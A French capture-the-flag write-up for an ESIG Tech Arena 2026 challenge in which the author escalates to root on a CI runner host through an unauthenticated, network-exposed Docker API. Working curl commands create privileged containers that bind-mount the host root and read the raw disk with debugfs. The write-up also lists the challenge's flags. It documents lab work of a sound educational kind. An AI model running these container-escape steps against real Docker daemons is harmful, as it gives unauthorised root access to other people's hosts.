---
# Imported from Obsidian: CTF/ESIG Tech Arena CTF/Akpete - Docker API Escape.md
title: Akpete — Docker API Escape
category: Web
ctf: ESIG Tech Arena 2026
competition: esig-tech-arena-2026
date: 2026-09-28
summary: Le socket Docker (/var/run/docker.sock en local, ou le port 2375/tcp en réseau) parle à dockerd, qui s'exécute avec les privilèges root. Toute personne capable de dialoguer avec…
tags:
- boot2root
- container-escape
- docker
- esig-tech-arena-2026
- misconfiguration
- web
lang: fr
imported: true
---

> **TL;DR**
> Le démon Docker d'un runner de CI est exposé sur le réseau **sans TLS ni authentification**. L'API Docker distante donne un contrôle total du démon ; comme `dockerd` tourne en root, cela se transforme trivialement en **root sur l'hôte**. On récupère les trois flags en combinant : lecture des logs de jobs passés, montage du système de fichiers hôte via un conteneur privilégié, et lecture hors-ligne du disque brut avec `debugfs`.
>
> **Flag final :** `EthACTF{manifest_runner_image},EthACTF{depot_archive_cle},EthACTF{conteneur_montage_bind}`

---

## 1. Énoncé

> EthACTF Corp utilise un runner de jobs (un daemon Docker) pour la CI. Le daemon a été exposé sur le réseau de l'entreprise en **2375**, sans TLS et sans authentification.
> **Objectif :** prendre le root de l'hôte sur lequel tourne le runner.
> **Hôte :** `https://docker-api-escape.ctf.esig.tg`
> **Format du flag :** `EthACTF{flag1},EthACTF{flag2},EthACTF{flag3}`

## 2. Rappel — pourquoi une API Docker exposée = game over

Le socket Docker (`/var/run/docker.sock` en local, ou le port **2375/tcp** en réseau) parle à `dockerd`, qui s'exécute avec les privilèges **root**. Toute personne capable de dialoguer avec cette API peut :

- lancer un conteneur en mode `--privileged` ;
- monter n'importe quel chemin de l'hôte dans un conteneur (`-v /:/host`) ;
- attacher le conteneur au namespace réseau de l'hôte (`--network host`).

Il n'existe **aucune séparation de privilèges** : l'API n'a pas de notion d'utilisateur restreint. Exposer 2375 sans mTLS revient donc à publier un shell root sur le réseau. C'est répertorié par la documentation Docker elle-même comme la pire configuration possible.

> **Le piège de ce challenge**
> Le démon n'est pas sur l'hôte final directement : il tourne lui-même **dans un conteneur** (montage **Docker-in-Docker**). Le `/` qu'on voit depuis un conteneur qu'on lance n'est donc **pas** le vrai hôte. Percer cette seconde couche est ce qui distingue le flag « conteneur » du flag « vrai hôte ».

---

## 3. Reconnaissance

### 3.1 Le port 2375 n'est pas routé directement

```bash
docker -H tcp://docker-api-escape.ctf.esig.tg:2375 version
# → dial tcp ...:2375: connect: no route to host
```

Le port brut est filtré. Mais l'énoncé fournit un hôte **HTTPS** : l'API est reverse-proxifiée derrière le **443** par Traefik. On teste les endpoints non authentifiés `/version` et `/_ping` :

```bash
curl -sk https://docker-api-escape.ctf.esig.tg/version | jq .
curl -sk https://docker-api-escape.ctf.esig.tg/_ping ; echo
```

```json
{
  "Version": "24.0.9",
  "ApiVersion": "1.43",
  "Os": "linux",
  "KernelVersion": "6.8.0-139-generic",
  ...
}
```
```
OK
```

> **Accès confirmé**
> API Docker **24.0.9 / API 1.43**, aucune authentification. Le reverse proxy expose directement le démon. Le client `docker` refuse le schéma `https://` dans `DOCKER_HOST` (il attend `tcp://` + certificat client), donc **tout le reste se pilote en `curl`** contre l'API REST.

### 3.2 Inventaire — les jobs passés fuitent

```bash
curl -sk "https://docker-api-escape.ctf.esig.tg/containers/json?all=true" | jq .
curl -sk https://docker-api-escape.ctf.esig.tg/images/json | jq '.[] | {Id, RepoTags, Labels}'
```

Le listing révèle une image unique (`ethactf-b2r-docker-runner-base:1`) et une série de conteneurs `exited` laissés par d'autres joueurs / l'auteur. Leurs `Command` dessinent trois chemins d'attaque distincts :

| Conteneur | Commande (extrait) | Ce que ça révèle |
|---|---|---|
| `determined_herschel`, `sweet_meninsky` | `chroot /mnt sh -c "cat /root/flag*"` sur bind `/:/mnt` | Évasion « naïve » → root du **conteneur DinD** |
| `pwn-realhost` | `mount -o ro /host/dev/sda1 /rh` puis grep « REAL host » | Montage du **disque brut** → vrai hôte |
| `serene_kapitsa`, `naughty_diffie` | `wget --header="X-Vault-Token: x" http://172.28.6.2:8000/v1/secret` | Service type **Vault** sur le réseau interne (`--network host`) |

> **Finding en soi**
> L'API `/containers/{id}/logs` est ouverte. Or **les jobs passés impriment leurs résultats sur stdout**. On peut donc parfois récupérer des secrets sans même relancer d'exploit — le démon nous ressert les sorties.

---

## 4. Exploitation

### 4.1 Flags par lecture des logs de jobs (flag3 & flag2)

```bash
for id in 219d9effbc74 02411ec82f2e; do
  echo "===== $id ====="
  curl -sk "https://docker-api-escape.ctf.esig.tg/containers/$id/logs?stdout=true&stderr=true" | strings
done
```

> `strings` supprime les octets d'en-tête de multiplexage que l'API Docker préfixe à chaque frame de log.

```
===== 219d9effbc74 =====   (chroot sur bind mount)
 EthACTF{conteneur_montage_bind}
===== 02411ec82f2e =====   (secret Vault via network host)
 "secret": "EthACTF{depot_archive_cle}",
```

Deux flags tombent immédiatement. Le conteneur `pwn-realhost` (celui du vrai hôte), lui, a été nettoyé (`No such container`) — on doit refaire nous-mêmes cette partie.

### 4.2 Root sur le vrai hôte — le cœur du challenge

**Tentative 1 — remonter le disque échoue.** On crée un conteneur privilégié avec bind `/:/host` qui tente `mount /dev/sda1`. Résultat : `mount rc: 255` puis `Resource busy`.

L'explication est dans la table des montages (obtenue via un conteneur de diagnostic lisant `/proc/mounts`) :

```
/dev/sda1 /host/var/lib/docker  ext4 rw,relatime,...
/dev/sda1 /host/etc/hostname     ext4 ...
```

`/dev/sda1` est **déjà monté** (il porte `/var/lib/docker`, donc toute la couche DinD). Le noyau refuse un second montage du même superblock ext4 → `EBUSY`. Le device existe pourtant bien (`major 8, minor 1`), il est juste verrouillé en exclusivité.

**Tentative 2 — lecture hors-ligne avec `debugfs`.** L'astuce : `debugfs` lit un système de fichiers ext4 **directement sur le device, sans le monter**. Donc pas de conflit `EBUSY`. On l'exécute depuis un conteneur privilégié :

```bash
curl -sk -X POST "https://docker-api-escape.ctf.esig.tg/containers/create?name=dbg" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "ethactf-b2r-docker-runner-base:1",
    "Cmd": ["/bin/sh","-c","debugfs -c -R \"ls -l /root\" /dev/sda1 2>&1"],
    "HostConfig": { "Privileged": true, "Binds": ["/:/host"] }
  }' | jq -r .Id

curl -sk -X POST ".../containers/dbg/start" -w "HTTP %{http_code}\n"
curl -sk ".../containers/dbg/logs?stdout=true&stderr=true" | strings
```

> L'option `-c` ouvre le FS en mode « catastrophe » (lecture seule, ignore les incohérences de bitmap dues au fait que le FS est vivant et monté ailleurs).

Le `/root` retourné est **radicalement différent** de celui du conteneur : vrai `/root` d'admin avec `.ssh`, `.docker`, un `.bash_history` de 40 Ko, un `.Xauthority` récent. La racine (`ls -l /`) montre `lost+found`, `snap`, `/home/ubuntu`, `/boot`… → **on lit le vrai disque hôte sous la couche DinD.** 🎯

> **Objectif atteint**
> Contrôle total du démon → lecture arbitraire du disque de l'hôte physique. Le boot2root est techniquement acquis.

### 4.3 Localiser le troisième flag proprement

Plutôt que de grep tout le disque (voir §5), on suit la structure de déploiement du challenge, lue au `debugfs` :

```
/opt/challenges/b2r/docker_api_escape/
├── deploy/
│   ├── get_flags.sh      ← source canonique
│   ├── .env
│   ├── docker-compose.yml
│   └── ...
├── solution/
├── public/
└── README.md
```

`get_flags.sh` documente **où vivent les trois flags** :

```bash
raw=$(docker compose exec -T dind cat /run/ethactf/flags.json)
# imprime flag1, flag2, flag3
```

On lit donc `flags.json` via le bind `/:/host` (fichier situé dans le rootfs du runner DinD) :

```bash
curl -sk -X POST ".../containers/create?name=f" -H "Content-Type: application/json" \
  -d '{"Image":"ethactf-b2r-docker-runner-base:1",
       "Cmd":["/bin/sh","-c","cat /host/run/ethactf/flags.json"],
       "HostConfig":{"Privileged":true,"Binds":["/:/host"]}}' | jq -r .Id
# start + logs ...
```

```json
{
  "instance": "e35008f9205b",
  "flag1": "EthACTF{manifest_runner_image}",
  "flag2": "EthACTF{depot_archive_cle}",
  "flag3": "EthACTF{conteneur_montage_bind}"
}
```

Cette source canonique **corrige la numérotation** que l'on aurait pu supposer :

| Flag | Valeur | Vecteur prévu |
|---|---|---|
| **flag1** | `EthACTF{manifest_runner_image}` | Inspection de l'image/manifest du runner via l'API (`/images/.../json`, labels/couches) |
| **flag2** | `EthACTF{depot_archive_cle}` | Secret « Vault » interne (`/v1/secret`, `--network host`) |
| **flag3** | `EthACTF{conteneur_montage_bind}` | Root du conteneur via bind mount `/:/mnt` + `chroot` |

---

## 5. Le flag final

```
EthACTF{manifest_runner_image},EthACTF{depot_archive_cle},EthACTF{conteneur_montage_bind}
```

_**— 3ch0**_
